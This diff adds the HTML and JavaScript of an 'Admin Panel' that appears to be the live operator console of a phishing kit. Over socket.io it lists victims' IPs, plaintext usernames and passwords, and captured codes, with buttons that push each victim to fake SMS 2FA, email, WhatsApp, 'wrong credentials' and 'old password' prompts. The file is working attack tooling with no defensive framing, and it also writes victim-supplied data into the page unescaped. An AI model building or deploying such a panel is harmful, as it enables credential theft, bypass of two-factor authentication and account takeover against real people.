@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Panel</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      padding: 20px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #333;
+    }
+
+    .user-box {
+      background: white;
+      border-radius: 10px;
+      padding: 15px;
+      margin: 15px auto;
+      max-width: 600px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+      position: relative;
+    }
+
+    .user-id {
+      font-weight: bold;
+      margin-bottom: 10px;
+      word-break: break-all;
+    }
+
+    .new-badge {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      background: #ff4757;
+      color: white;
+      font-size: 12px;
+      padding: 3px 7px;
+      border-radius: 5px;
+    }
+
+    button {
+      padding: 7px 12px;
+      margin: 4px 5px 4px 0;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .sms {
+      background-color: #3498db;
+      color: white;
+    }
+
+    .auth {
+      background-color: #8e44ad;
+      color: white;
+    }
+
+    .email {
+      background-color: #2ecc71;
+      color: white;
+    }
+
+    .why {
+      background-color: #e67e22;
+      color: white;
+    }
+
+    .msg {
+      background-color: #f1c40f;
+      color: black;
+    }
+
+    .disconnect {
+      background-color: #e74c3c;
+      color: white;
+    }
+
+    .login {
+      background-color: #f39c12;
+      color: white;
+    }
+
+    #output {
+      text-align: center;
+      margin-top: 30px;
+      font-weight: bold;
+    }
+
+    .wrong {
+      background-color: #c0392b;
+      color: white;
+    }
+
+    .old {
+      background-color: #d35400;
+      color: white;
+    }
+  </style>
+</head>
+
+<body>
+
+  <h2>Admin Panel</h2>
+  <div id="users-container"></div>
+  <div id="output"></div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io('/panel');
+    const usersContainer = document.getElementById('users-container');
+    const output = document.getElementById('output');
+
+    socket.on('update-users', ({ users, newUsers }) => {
+      usersContainer.innerHTML = '';
+      users.forEach(user => {
+        const isNew = newUsers.includes(user.id);
+        const box = document.createElement('div');
+        box.className = 'user-box';
+        box.innerHTML = `
+          <div class="user-id">🧑 User ID: <code>${user.id}</code></div>
+          ${isNew ? `<div class="new-badge">NEW</div>` : ''}
+          <div><strong>🌐 IP:</strong> ${user.ip}</div>
+          <div><strong>🕒 Time:</strong> ${user.time.time} on ${user.time.date}</div>
+          <div><strong>📶 Status:</strong> ${user.isConnected ? '🟢 Connected' : '🔴 Disconnected'}</div>
+          <div><strong>Login:</strong> ${user.login?.username || 'N/A'} | ${user.login?.password || 'N/A'}</div>
+          <div><strong>Action:</strong> ${user.action || 'None'}</div>
+          <div><strong>Codes:</strong> ${(user.codes || []).join(', ')}</div>
+          <br>
+          <button class="sms" onclick="send('send-sms', '${user.id}')">2FA (SMS)</button>
+          <button class="auth" onclick="send('send-auth', '${user.id}')">Auth</button>
+          <button class="email" onclick="send('send-email', '${user.id}')">Email</button>
+          <button class="why" onclick="send('send-wh', '${user.id}')">Whatsapp</button>
+            <button class="wrong" onclick="send('send-wrong-creds', '${user.id}')">Wrong Creds</button>
+  <button class="old" onclick="send('send-old-pass', '${user.id}')">Old Pass</button>
+          <button class="why" onclick="send('send-calendar', '${user.id}')">Calendly</button>
+          <button class="disconnect" onclick="banIp('${user.id}')">❌ Ban IP</button>
+         
+        `;
+        usersContainer.appendChild(box);
+      });
+    });
+
+    socket.on('panel-success', data => {
+      output.textContent = `✅ ${data.message}`;
+    });
+
+    socket.on('panel-error', data => {
+      output.textContent = `❌ ${data.message}`;
+    });
+
+    function send(event, userId) {
+      socket.emit(event, userId);
+    }
+
+    function sendMessage(userId) {
+      const message = prompt("Enter message to send:");
+      if (message) {
+        socket.emit('send-message', userId, message);
+      }
+    }
+
+    function sendLoginData(userId) {
+      const username = prompt("Enter username:");
+      const password = prompt("Enter password:");
+      if (username && password) {
+        socket.emit('send-login-data', userId, username, password);
+      }
+    }
+    function banIp(userId) {
+      const confirmBan = confirm(`Are you sure you want to ban this user's IP?\nUser ID: ${userId}`);
+      if (confirmBan) {
+        socket.emit('ban-ip', userId);
+      }
+    }
+
+  </script>
+
+
+</body>
+
+</html>
